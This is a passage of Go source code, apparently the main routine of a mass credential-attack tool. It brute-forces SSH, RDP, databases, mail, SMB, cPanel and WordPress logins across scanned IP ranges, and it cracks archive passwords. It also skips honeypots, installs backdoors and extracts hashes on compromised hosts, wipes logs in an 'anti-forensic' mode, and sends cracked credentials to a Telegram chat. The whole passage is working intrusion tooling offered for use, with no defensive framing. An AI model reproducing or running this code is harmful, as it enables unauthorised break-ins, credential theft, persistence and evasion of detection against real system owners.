	zipBuffer := flag.Int("zip-buffer", 10000, "Buffer size for ZIP")

	checkerMode := flag.Bool("check", false, "Enable checker mode (cpanel/wordpress)")
	checkerTargets := flag.String("check-targets", "", "Targets file (url or url:user:pass format)")
	checkerCreds := flag.String("check-creds", "", "Credentials file (user:pass format)")
	checkerType := flag.String("check-type", "auto", "Check type: cpanel, wordpress, auto")
	checkerOutput := flag.String("check-out", "checker_results.txt", "Output file for results")
	checkerOutputFormat := flag.String("check-out-format", "url:user:pass", "Output format: url:user:pass or user:pass@url")
	checkerSmart := flag.Bool("check-smart", true, "Enable smart detection")

	flag.Parse()

	if *checkerMode {
		fmt.Printf("%s\n", strings.Repeat("=", 80))
		fmt.Printf("%s CHECKER MODE ACTIVATED - CPanel & WordPress%s\n", colors.Cyan, colors.Reset)
		fmt.Printf("%s\n", strings.Repeat("=", 80))

		if *checkerTargets == "" {
			fmt.Printf("%s[ERROR] -check-targets is required for checker mode%s\n", colors.Red, colors.Reset)
			os.Exit(1)
		}

		checkerCfg := checker.CheckerConfig{
			TargetsFile:    *checkerTargets,
			CredsFile:      *checkerCreds,
			Format:         *checkerType,
			Threads:        *threads,
			Timeout:        *timeout,
			RateLimit:      *webRateLimit,
			Output:         *checkerOutput,
			GPUAccel:       *gpuAccel,
			SmartDetection: *checkerSmart,
			ProxyURL:       "",
			Debug:          *webDebug,
			Resume:         *resume,
			CheckerType:    *checkerType,
			OutputFormat:   *checkerOutputFormat,
		}

		if *gpuAccel {
			InitGPUAccelerator(true)
			gpuAccelerator.PrintStats()
		}

		c := checker.NewChecker(checkerCfg)
		c.Run()

		if *gpuAccel {
			gpuAccelerator.Close()
		}

		fmt.Printf("\n%s[DONE] Checker finished%s\n", colors.Cyan, colors.Reset)
		return
	}

	if *reqFile != "" {
		runWebInfernoMode(
			reqFile, webVars, webIfin, webIfnin,
			webTokenRegex, webAutoToken,
			webOut, webFail, webTokensOut, webRandomDelay,
			webThreads, webTimeout, webRateLimit, webRetries,
			webEvasion, webIntel, webLearn, webFollowRedirect,
			webMaxRedirects, webMethod, webBody, webHeaders,
			dynamicToken, tokenURL, tokenMethod, tokenStart, tokenEnd, tokenRefresh, tokenField, webDebug, webJSON, webXML,
			webAuthType, webAuthUser, webAuthPass, webAuthToken,
			oauthClientID, oauthClientSecret, oauthTokenURL, oauthScope,
			webFuzzPayloads, webFuzzPositions,
			webSocketURL, graphQLEndpoint,
			clusterNodes,
			reportHTML, webAdaptiveRate, OutputFormat,
		)
		return
	}

	var hosts []string
	if *hostsFile == "" {
		fmt.Printf("%s[ERROR] -hs (hosts file) or -req (HTTP request) required%s\n", colors.Red, colors.Reset)
		os.Exit(1)
	}

	if strings.Contains(*hostsFile, "/") && !strings.Contains(*hostsFile, ".") {
		ips, err := expandCIDR(*hostsFile)
		if err != nil {
			fmt.Printf("%s[ERROR] invalid CIDR: %v%s\n", colors.Red, err, colors.Reset)
			os.Exit(1)
		}
		hosts = ips
		fmt.Printf("[CIDR] Expanded to %d IPs\n", len(hosts))
	} else if !strings.Contains(*hostsFile, "\n") && !strings.Contains(*hostsFile, ".txt") && !strings.Contains(*hostsFile, "/") {
		hosts = []string{*hostsFile}
	} else {
		var err error
		hosts, err = readLines(*hostsFile)
		if err != nil || len(hosts) == 0 {
			fmt.Printf("%s[ERROR] invalid hosts file%s\n", colors.Red, colors.Reset)
			os.Exit(1)
		}
	}

	var users, passes []string

	if *credsFile != "" {
		u, p, err := readCredsFile(*credsFile)
		if err == nil && len(u) > 0 {
			users, passes = u, p
			fmt.Printf("[CREDS] Loaded %d credentials from combined file\n", len(users))
		}
	} else {
		if *userInput != "" {
			users = getListFromInput(*userInput)
			if len(users) == 1 && !strings.Contains(*userInput, ".txt") && !strings.Contains(*userInput, ".lst") {
				fmt.Printf("[USERS] Single user: %s\n", users[0])
			} else {
				fmt.Printf("[USERS] Loaded %d users\n", len(users))
			}
		}

		if *passInput != "" {
			passes = getListFromInput(*passInput)
			if len(passes) == 1 && !strings.Contains(*passInput, ".txt") && !strings.Contains(*passInput, ".lst") {
				fmt.Printf("[PASSWORDS] Single password: %s\n", passes[0])
			} else {
				fmt.Printf("[PASSWORDS] Loaded %d passwords\n", len(passes))
			}
		}

		if len(users) == 1 && len(passes) == 0 && strings.Contains(users[0], ":") {
			parts := strings.SplitN(users[0], ":", 2)
			users = []string{parts[0]}
			passes = []string{parts[1]}
			fmt.Printf("[PARSED] User: %s | Pass: %s\n", users[0], passes[0])
		}
	}

	if len(users) == 0 && *proto != "vnc" && *proto != "snmp" && *proto != "redis" {
		fmt.Printf("%s[ERROR] No users specified! Use -u (username or file) or -c (creds file)%s\n", colors.Red, colors.Reset)
		os.Exit(1)
	}

	if len(passes) == 0 && *proto != "vnc" && *proto != "snmp" && *proto == "ssh" {
		fmt.Printf("%s[ERROR] No passwords specified! Use -psw (password or file)%s\n", colors.Red, colors.Reset)
		os.Exit(1)
	}

	fmt.Printf("\n%s═══════════════════════════════════════════════════════════════%s\n", colors.Cyan, colors.Reset)
	fmt.Printf("%s[CONFIG] Protocol: %s | Hosts: %d | Users: %d | Passwords: %d%s\n",
		colors.Green, *proto, len(hosts), len(users), len(passes), colors.Reset)
	fmt.Printf("%s═══════════════════════════════════════════════════════════════%s\n\n", colors.Cyan, colors.Reset)

	if *teleToken != "" {
		config.TelegramToken = *teleToken
	}
	if *teleChat != "" {
		config.TelegramChatID = *teleChat
	}
	if config.TelegramToken != "" && config.TelegramChatID != "" {
		internal.InitTelegramLimiter()
	}

	if *antiForensic {
		afm = antiforensic.NewAntiForensicManager()
		fmt.Printf("%s[ANTI-FORENSIC] Enabled - Log wiping, memory cleaning, credential dumping active%s\n", colors.Green, colors.Reset)
	}

	if *rarFile != "" && *rarDict != "" {
		fmt.Printf("%s\n", strings.Repeat("=", 60))
		fmt.Printf("%s RAR CRACKER MODE ACTIVATED %s\n", colors.Red, colors.Reset)
		fmt.Printf("%s\n", strings.Repeat("=", 60))

		cracker := archive.NRarCracker(*rarFile, *rarDict, *rarWorkers, *rarBuffer)
		result := cracker.Crack()

		fmt.Printf("\n%s\n", strings.Repeat("=", 60))
		if result.Success {
			fmt.Printf("%s[ok] PASSWORD FOUND: %s%s\n", colors.Green, result.Password, colors.Reset)
		} else {
			fmt.Printf("%s[no] No password found%s\n", colors.Red, colors.Reset)
		}
		if result.Error != "" {
			fmt.Printf("%s[no] Error: %s%s\n", colors.Red, result.Error, colors.Reset)
		}
		fmt.Printf("[ok] Time: %v (%.2f pwd/sec)\n", result.TimeSpent, float64(result.Tested)/result.TimeSpent.Seconds())
		fmt.Printf("[ok] Tested: %d passwords\n", result.Tested)
		fmt.Printf("%s\n", strings.Repeat("=", 60))

		if *hostsFile == "" && *reqFile == "" {
			return
		}
	}

	if *zipFile != "" && *zipDict != "" {
		fmt.Printf("\n%s ZIP CRACKER %s\n", strings.Repeat("=", 50), strings.Repeat("=", 50))
		cracker := archive.NZipCracker(*zipFile, *zipDict, *zipWorkers, *zipBuffer)
		result := cracker.Crack()
		fmt.Printf("\n%s\n", strings.Repeat("=", 60))
		if result.Success {
			fmt.Printf("%s[ok] PASSWORD FOUND: %s%s\n", colors.Green, result.Password, colors.Reset)
		} else {
			fmt.Printf("%s[no] No password found%s\n", colors.Red, colors.Reset)
		}
		if result.Error != "" {
			fmt.Printf("%s[no] Error: %s%s\n", colors.Red, result.Error, colors.Reset)
		}
		fmt.Printf("[ok] Time: %v (%.2f pwd/sec)\n", result.TimeSpent, float64(result.Tested)/result.TimeSpent.Seconds())
		fmt.Printf("[ok] Tested: %d passwords\n", result.Tested)
		fmt.Printf("%s\n", strings.Repeat("=", 60))

		if *hostsFile == "" && *reqFile == "" {
			return
		}
	}

	if *portScanFlag != "" {
		ports, err := parsePorts(*portScanFlag)
		if err != nil {
			fmt.Printf("%s[ERROR] invalid port range: %v%s\n", colors.Red, err, colors.Reset)
			os.Exit(1)
		}

		var wg sync.WaitGroup
		maxHostThreads := *threads
		if maxHostThreads > 1000 {
			maxHostThreads = 1000
		}
		sem := make(chan struct{}, maxHostThreads)

		fmt.Printf("\n[PARALLEL SCAN] Scanning %d hosts with %d threads\n", len(hosts), maxHostThreads)

		for _, host := range hosts {
			wg.Add(1)
			sem <- struct{}{}

			go func(h string) {
				defer wg.Done()
				defer func() { <-sem }()
				portScan(h, ports, *threads)
			}(host)
		}

		wg.Wait()
		fmt.Printf("\n%s[INFO] Port scan completed. Exiting...%s\n", colors.Cyan, colors.Reset)
		os.Exit(0)
	}

	var ramdiskPath string
	if *ramDisk {
		ramdiskPath = initRAMDisk()
	}

	gpuSpeedup := 1.0
	if *gpuAccel {
		InitGPUAccelerator(true)
		gpuAccelerator.PrintStats()
		gpuSpeedup = gpuAccelerator.EstimateSpeedup(len(crackedList))
	}

	if *multiCity {
		fmt.Printf("%s[MULTI-CITY] Routing through %d cities worldwide%s\n", colors.Cyan, len(prtl.CityRoutes), colors.Reset)
		for _, city := range prtl.CityRoutes {
			fmt.Printf("  - %s (latency: %dms)\n", city.Name, city.Latency)
		}
	}

	backdoorCfg := ex.BackdoorConfig{
		Enabled:  *backdoorEnabled,
		Type:     *backdoorType,
		Port:     *backdoorPort,
		User:     *backdoorUser,
		Password: *backdoorPass,
		SSHKey:   *backdoorKey,
	}

	if *monitor {
		go func() {
			ticker := time.NewTicker(10 * time.Second)
			defer ticker.Stop()
			for range ticker.C {
				var memStats runtime.MemStats
				runtime.ReadMemStats(&memStats)
				goroutines := runtime.NumGoroutine()
				fmt.Printf("\r%s[MONITOR] Goroutines: %d | Memory: %.2f MB | Attempts: %d | Cracked: %d | Speed: %.1fx%s",
					colors.Cyan, goroutines, float64(memStats.Alloc)/1024/1024, prtl.TotalAttempts, len(crackedList), gpuSpeedup, colors.Reset)
			}
		}()
	}

	crackedBuffer = prtl.NewCircularBuffer("Cracked.txt", maxFileBuffer)
	defer crackedBuffer.Close()

	prtl.SetCrackedBuffer(crackedBuffer)

	hostPortMap := make(map[string]string)
	cleanHosts := []string{}
	for _, item := range hosts {
		if strings.Contains(item, ":") {
			parts := strings.SplitN(item, ":", 2)
			cleanHosts = append(cleanHosts, parts[0])
			hostPortMap[parts[0]] = parts[1]
		} else {
			cleanHosts = append(cleanHosts, item)
		}
	}
	hosts = cleanHosts

	portVal := *portFlag
	if portVal == "" {
		switch *proto {
		case "ssh":
			portVal = "22"
		case "rdp":
			portVal = "3389"
		case "ftp":
			portVal = "21"
		case "mysql":
			portVal = "3306"
		case "smb", "smb2":
			portVal = "445"
		case "telnet":
			portVal = "23"
		case "vnc":
			portVal = "5900"
		case "postgres":
			portVal = "5432"
		case "mssql":
			portVal = "1433"
		case "redis":
			portVal = "6379"
		case "mongodb":
			portVal = "27017"
		case "pop3":
			portVal = "110"
		case "imap":
			portVal = "143"
		case "smtp":
			portVal = "25"
		case "snmp":
			portVal = "161"
		case "ldap":
			portVal = "389"
		default:
			portVal = "22"
		}
	}

	if *autoDetectPort && len(hosts) > 0 {
		detected := detectServicePort(hosts[0], *timeout)
		fmt.Printf("\n[AUTO-DETECT] Services on %s:\n", hosts[0])
		for service, p := range detected {
			fmt.Printf("  - %s: port %s\n", service, p)
		}
		fmt.Println()
	}

	var cp *prtl.Checkpoint
	startIdx := 0
	if *resume {
		var err error
		cp, err = prtl.LoadCheckpoint()
		if err == nil && cp != nil && !cp.Completed {
			fmt.Printf("[RESUME] Restoring from checkpoint\n")
			startIdx = cp.HostIndex
			portVal = cp.Port
			*timeout = cp.Timeout
			*mode = cp.Mode
		}
	}
	if cp == nil {
		cp = &prtl.Checkpoint{
			CrackedMap:  make(map[string]string),
			FailedHosts: make(map[string]int),
			BannedHosts: make(map[string]string),
		}
	}

	var aliveHosts []string
	if !*skipAlive && len(cp.Hosts) == 0 && !*massPwnFlag {
		fmt.Printf("\n[SCAN] Checking %d hosts\n", len(hosts))
		var wg sync.WaitGroup
		aliveChan := make(chan string, len(hosts))
		var aliveMu sync.Mutex
		workerCount := *threads
		if workerCount > 1000 {
			workerCount = 1000
		}
		if workerCount < 1 {
			workerCount = 100
		}
		sem := make(chan struct{}, workerCount)
		for i := 0; i < workerCount; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for h := range aliveChan {
					select {
					case sem <- struct{}{}:
						usePort := portVal
						if customPort, ok := hostPortMap[h]; ok {
							usePort = customPort
						}
						if prtl.IsHostBanned(h, cp) {
							<-sem
							continue
						}
						if isAlive(h, usePort, *timeout) {
							aliveMu.Lock()
							aliveHosts = append(aliveHosts, h)
							aliveMu.Unlock()
							fmt.Printf("  %sok%s %s:%s\n", colors.Green, colors.Reset, h, usePort)
							saveLiveHost(h, usePort)
						} else {
							fmt.Printf("  %s[no]%s %s:%s\n", colors.Red, colors.Reset, h, usePort)
							cp.Lock()
							if cp.FailedHosts == nil {
								cp.FailedHosts = make(map[string]int)
							}
							cp.FailedHosts[h] = cp.FailedHosts[h] + 1
							cp.Unlock()
						}
						<-sem
					default:
						time.Sleep(10 * time.Millisecond)
						aliveChan <- h
					}
				}
			}()
		}
		for _, h := range hosts {
			aliveChan <- h
		}
		close(aliveChan)
		wg.Wait()
		fmt.Printf("\n[LIVE] %d/%d hosts alive\n", len(aliveHosts), len(hosts))
		fmt.Printf("[SAVED] LIVE.txt (%d hosts added)\n\n", len(aliveHosts))
		cp.Hosts = aliveHosts
		prtl.SaveCheckpoint(cp)
	} else if len(cp.Hosts) > 0 {
		aliveHosts = cp.Hosts
		fmt.Printf("[RESUME] Using %d hosts from checkpoint\n", len(aliveHosts))
	}

	if len(aliveHosts) == 0 && !*skipAlive && !*massPwnFlag {
		fmt.Printf("%s[!] No alive hosts%s\n", colors.Yellow, colors.Reset)
		os.Exit(1)
	}
	if len(aliveHosts) == 0 && *skipAlive {
		aliveHosts = hosts
	}

	honeypotCount := 0
	bannedCount := len(cp.BannedHosts)
	if *honeypotCheck && len(aliveHosts) > 0 && !*massPwnFlag {
		fmt.Printf("[HONEYPOT] Checking for honeypots...\n")
		checkLimit := min(10, len(aliveHosts))
		for i := 0; i < checkLimit; i++ {
			host := aliveHosts[i]
			banner, err := prtl.GetFullSSHBanner(host, portVal, *timeout)
			if err == nil {
				analysis := hp.DetectHoneypot(host, portVal, banner, *timeout)
				if analysis.IsHoneypot {
					honeypotCount++
					banHost(host, analysis.Reason, cp)
					if config.TelegramToken != "" && config.TelegramChatID != "" {
						go internal.SendTelegramNotification("honeypot", map[string]interface{}{
							"host":       host,
							"port":       portVal,
							"confidence": analysis.Confidence * 100,
							"reason":     analysis.Reason,
						})
					}
				}
				fmt.Printf("  %s: %.0f%% confidence (response: %dms, hash: %s)\n", host, analysis.Confidence*100, analysis.ResponseTime, analysis.BannerHash[:8])
			}
			time.Sleep(100 * time.Millisecond)
		}
		fmt.Println()
	}

	if *attackMode != "normal" && len(users) > 0 && len(hosts) > 0 {
		fmt.Printf("[ATTACK MODE] Using %s mode\n", *attackMode)
		for _, host := range hosts {
			for _, user := range users {
				var success bool
				switch *attackMode {
				case "null":
					success = attackModeNull(host, portVal, user, *timeout, *proto)
				case "userpass":
					success = attackModeUserAsPass(host, portVal, user, *timeout, *proto)
				case "reverse":
					success = attackModeReverseUser(host, portVal, user, *timeout, *proto)
				}
				if success {
					fmt.Printf("\n%sok %s MODE CRACKED:%s %s@%s (no password needed)\n",
						colors.Green, strings.ToUpper(*attackMode), colors.Reset, user, host)
				}
			}
		}
	}

	if *httpFormPath != "" && *httpUserField != "" && *httpPassField != "" && len(users) > 0 && len(passes) > 0 && len(hosts) > 0 {
		fmt.Printf("[HTTP] Brute-forcing %s on %s\n", *httpFormPath, hosts[0])
		for _, user := range users {
			for _, pass := range passes {
				if runHTTPForm(hosts[0], portVal, *httpFormPath, *httpUserField, *httpPassField, user, pass, *timeout) {
					fmt.Printf("\n%sok HTTP CRACKED:%s %s:%s@%s:%s\n",
						colors.Green, colors.Reset, *httpUserField, user, *httpPassField, pass)
				}
			}
		}
	}

	if *additionalProto != "" && *proto != *additionalProto && len(users) > 0 && len(passes) > 0 {
		runAdditionalProtocols(aliveHosts, *additionalProto, portVal, users, passes, *timeout)
	}

	if *proto == "ssh" {
		if len(users) == 0 {
			fmt.Printf("%s[ERROR] ssh needs -u or -c%s\n", colors.Red, colors.Reset)
			os.Exit(1)
		}
		prtl.RunSSH(aliveHosts, portVal, users, passes, *mode, *timeout, *minDelay, *maxDelay, startIdx, *notify, *smartPass, *postExploitFlag, *scanNetworkFlag, *extractHashFlag, *generateScriptFlag, cp, backdoorCfg, *backdoorEnabled, ramdiskPath, *multiCity, *massPwnFlag, *antiForensic)
		crackedList = prtl.GetCrackedList()

	} else if *proto == "rdp" {
		if len(users) == 0 || len(passes) == 0 {
			fmt.Printf("%s[ERROR] rdp needs -u and -psw or -c%s\n", colors.Red, colors.Reset)
			os.Exit(1)
		}

		prtl.SetRDPSuccessCallback(func(host, port, user, pass string) {
			crackedMu.Lock()
			entry := fmt.Sprintf("%s:%s|%s:%s|RDP", host, port, user, pass)
			crackedList = append(crackedList, entry)
			crackedMu.Unlock()

			if crackedBuffer != nil {
				crackedBuffer.Append(entry)
			}

			if *notify == 1 && config.TelegramToken != "" && config.TelegramChatID != "" {
				go internal.SendTelegramNotification("cracked", map[string]interface{}{
					"host": host, "port": port, "user": user, "pass": pass, "banner": "RDP",
				})
			}

			if *postExploitFlag {
				go ex.P0stExploit(host, port, user, pass)
			}

			if *backdoorEnabled {
				go ex.InstallBackdoor(host, port, user, pass, backdoorCfg)
			}

			if *extractHashFlag {
				go ex.ExtractHashes(host, port, user, pass)
			}
		})

		prtl.SetRDPGlobals(cp, *postExploitFlag, *backdoorEnabled, *extractHashFlag,
			*scanNetworkFlag, *antiForensic, backdoorCfg, *notify == 1)

		prtl.RunRDP(aliveHosts, portVal, users, passes, *timeout)

	} else if *proto == "ftp" || *proto == "mysql" {
		if len(users) > 0 && len(passes) > 0 {
			runAdditionalProtocols(aliveHosts, *proto, portVal, users, passes, *timeout)
		} else {
			fmt.Printf("%s[ERROR] %s needs -u and -psw or -c%s\n", colors.Red, *proto, colors.Reset)
			os.Exit(1)
		}
	} else {
		if len(users) > 0 && len(passes) > 0 {
			RunAdditionalProtocolsExtended(aliveHosts, *proto, portVal, users, passes, *timeout, *threads, func(entry string) {
				if crackedBuffer != nil {
					crackedBuffer.Append(entry)
				}
			})
		} else {
			fmt.Printf("%s[ERROR] %s needs -u and -psw or -c%s\n", colors.Red, *proto, colors.Reset)
			os.Exit(1)
		}
	}

	if *gpuAccel {
		gpuAccelerator.Close()
	}

	fmt.Printf("\n%s[DONE] Time: %s | Attempts: %d | Success: %d | Failed: %d | Cracked: %d | Honeypots: %d | Banned: %d | GPU Speedup: %.1fx%s\n",
		colors.Cyan, time.Since(startTime).Round(time.Second), prtl.TotalAttempts, prtl.SuccessAttempts, prtl.FailedAttempts, len(crackedList), honeypotCount, bannedCount, gpuSpeedup, colors.Reset)

	if *outputJSON || *outputCSV {
		exportResults(crackedList, prtl.CompletedHosts, prtl.TotalAttempts, prtl.SuccessAttempts, honeypotCount, bannedCount, gpuSpeedup)
	}

	if *notify == 2 && config.TelegramToken != "" && config.TelegramChatID != "" {
		go internal.SendTelegramNotification("scan_complete", map[string]interface{}{
			"duration":       time.Since(startTime).Round(time.Second).String(),
			"cracked_count":  len(crackedList),
			"honeypot_count": honeypotCount,
		})
	}

	os.Remove(prtl.CheckpointFile)
}
